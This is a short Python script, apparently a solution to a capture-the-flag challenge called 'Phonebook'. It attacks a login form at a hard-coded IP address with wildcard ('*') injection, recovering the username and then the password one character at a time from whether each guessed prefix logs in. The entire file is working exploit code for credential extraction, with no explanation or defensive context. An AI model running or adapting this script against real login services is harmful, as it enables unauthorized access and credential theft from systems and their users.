import requests

url = "http://138.68.141.81:32270/login"

user = ""
passwd = ""
done = False
r = requests.post(url, data={ 'username': user, 'password': passwd })

def chk_user(username):
	print("checking user: {}".format(username))
	r = requests.post(url, data={ 'username': username, 'password': "*" })
	return r.text[164:188]=='<title>Phonebook</title>' # returns true if login succeeded

def chk_pass(password):
	print("checking pass: {}".format(password))
	r = requests.post(url, data={ 'username': user, 'password': password })
	return r.text[164:188]=='<title>Phonebook</title>' # returns true if login succeeded

print(r.text)
while not done:
	if chk_user(user):
		print("user is {}".format(user))
		done = True
		break

	for i in range(33,128):
		if(i == ord("*")):
			continue
		if(chk_user(user + chr(i) + "*")):
			user += chr(i)
			break
done = False
while not done:
	if chk_pass(passwd):
		print("pass is {}".format(passwd))
		done = True
		break
	for i in range(33,128):
		if(i == ord("*")):
			continue
		if(chk_pass(passwd + chr(i) + "*")):
			passwd += chr(i)
			break

print("Done. User: {} Pass: {}".format(user,passwd))